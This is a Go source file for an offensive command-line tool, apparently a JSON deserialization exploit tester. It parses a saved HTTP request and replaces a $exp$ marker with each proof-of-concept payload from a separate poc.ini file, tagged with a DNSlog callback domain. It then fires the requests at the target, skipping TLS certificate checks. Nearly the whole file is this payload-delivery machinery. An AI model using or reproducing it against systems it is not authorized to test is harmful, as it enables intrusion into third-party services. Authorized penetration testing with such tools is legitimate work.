package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

type requests struct {
	method  string
	host    string
	header  map[string]string
	expbody string
	uri     string
}

func main() {
	run()
}

func run() {
	var reqFlie string
	var dnsLog string
	var ssl bool
	var h bool
	pocFile := "./poc.ini"

	flag.StringVar(&reqFlie, "r", "", "request文件``")
	flag.StringVar(&dnsLog, "d", "", "DNSlog地址``")
	flag.BoolVar(&ssl, "ssl", false, "HTTPS``")
	flag.BoolVar(&h, "h", false, "帮助``")
	flag.Usage = func() {
		fmt.Println(`Jsontest By Parzival 
Usage: JsonDataTest [-r] req.txt  [-d] x.dnslog.com [-ssl]`)
		flag.PrintDefaults()
	}
	flag.Parse()
	if h {
		flag.Usage()
	} else if reqFlie != "" {
		exp, _ := readFile(pocFile)     //读取poc
		x, _ := readFile(reqFlie)       //读取请求
		reqs := resolveRequest(x)       //处理请求
		exploit(reqs, dnsLog, exp, ssl) //exp
	}

}
func exploit(req requests, dnslog string, exp []string, ssl bool) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	method := req.method
	host := req.host
	header := req.header

	i := 0
	for _, value := range exp {
		uri := req.uri
		body := req.expbody
		i += 1
		if method == "POST" {
			if strings.Contains(body, "$exp$") {
				numexp := "POC" + strconv.Itoa(i) + "."
				exp := strings.Replace(value, "$dnslog_domain$", numexp+dnslog, -1)
				fmt.Printf("[^.^]测试POC%v:\n%v\n", i, exp)
				body = strings.Replace(body, "$exp$", exp, -1)
				var bodys = []byte(body)
				buffer := bytes.NewBuffer(bodys)
				if ssl {
					url := "https://" + host + uri
					request, _ := http.NewRequest("POST", url, buffer)
					for key, value := range header {
						request.Header.Set(key, value)
					}
					client := http.Client{Timeout: time.Duration(5 * time.Second), Transport: tr}
					resp, err := client.Do(request.WithContext(context.TODO()))
					if err != nil {
						fmt.Printf("[V.V]测试目标访问失败[V.V]")
					}
					fmt.Printf("[^.^]发送成功,返回状态码:%v[^.^]\n", resp.Status)
				} else {
					url := "http://" + host + uri
					request, _ := http.NewRequest("POST", url, buffer)
					for key, value := range header {
						request.Header.Set(key, value)
					}
					client := http.Client{Timeout: time.Duration(5 * time.Second)}
					resp, err := client.Do(request.WithContext(context.TODO()))
					if err != nil {
						fmt.Printf("[V.V]测试目标访问失败[V.V]")

					}
					fmt.Printf("[^.^]发送成功,返回状态码:%v[^.^]\n", resp.Status)
				}
			} else {
				fmt.Println("[V.V]请求包中不包含$exp$标识[V.V]")
				return
			}
		} else if method == "GET" {
			if strings.Contains(uri, "$exp$") {
				numexp := "POC" + strconv.Itoa(i) + "."
				exp := strings.Replace(value, "$dnslog_domain$", numexp+dnslog, -1)
				uri = strings.Replace(uri, "$exp$", exp, -1)
				fmt.Printf("[^.^]测试POC%v:\n%v\n", i, exp)
				if ssl {
					url := "https://" + host + "/" + uri
					request, _ := http.NewRequest("GET", url, nil)
					for key, value := range header {
						request.Header.Set(key, value)
					}
					client := http.Client{Timeout: time.Duration(5 * time.Second), Transport: tr}
					resp, err := client.Do(request.WithContext(context.TODO()))
					if err != nil {
						fmt.Printf("[V.V]测试目标访问失败[V.V]")
						return
					}
					log.Println("[^.^]发送成功,返回状态码:", resp.Status)
				} else {
					url := "http://" + host + "/" + uri
					request, _ := http.NewRequest("GET", url, nil)
					for key, value := range header {
						request.Header.Set(key, value)
					}
					client := http.Client{Timeout: time.Duration(5 * time.Second)}
					resp, err := client.Do(request.WithContext(context.TODO()))
					if err != nil {
						fmt.Printf("[V.V]测试目标访问失败")
						return
					}
					log.Println("[^.^]发送成功,返回状态码:", resp.Status)
				}

			} else {
				fmt.Println("[V.V]请求包中不包含$exp$标识[V.V]")
				return
			}
		}
	}
}

func resolveRequest(request []string) requests {
	methods := strings.Split(request[0], " ")
	var req requests
	req.method = methods[0]
	req.uri = methods[1]

	var hosts string
	req.header = make(map[string]string)
	for _, value := range request {
		var val string
		var key string
		if req.method == "POST" {
			if strings.Contains(value, "Host") {
				hosts = value
			} else if !strings.Contains(value, "HTTP/1.") && value != request[len(request)-1] {
				keyvalue := strings.Split(value, ": ")
				key := keyvalue[0]
				if len(keyvalue) != 1 {
					key = keyvalue[0]
					val = keyvalue[1]
				} else {
					continue
				}
				req.header[key] = val
			} else if value == request[len(request)-1] {
				req.expbody = value
			}

		} else if req.method == "GET" {
			if strings.Contains(value, "Host") {
				hosts = value
			} else if !strings.Contains(value, "HTTP/1.") {
				keyvalue := strings.Split(value, ": ")

				if len(keyvalue) != 1 {
					key = keyvalue[0]
					val = keyvalue[1]
				} else {
					continue
				}
				req.header[key] = val
			}
		} else {
			log.Println("[T.T]请求方法不支持,程序结束[T.T]")
			break
		}

	}
	req.host = strings.Split(hosts, " ")[1]
	return req
}

func readFile(fileName string) ([]string, error) {
	f, err := os.Open(fileName)
	var nameList []string
	if err != nil {
		log.Println("[V.V]文件打开失败[V.V]:")
		return nil, err
	}
	buf := bufio.NewReader(f)
	for {
		line, err := buf.ReadString('\n')
		line = strings.TrimSpace(line)
		if len(line) > 0 {
			nameList = append(nameList, line)
		}
		if err != nil {
			if err == io.EOF {
				return nameList, nil
			}
			log.Println("[V.V]文件打开失败[V.V]:")
			return nil, err
		}
	}
	return nameList, err
}
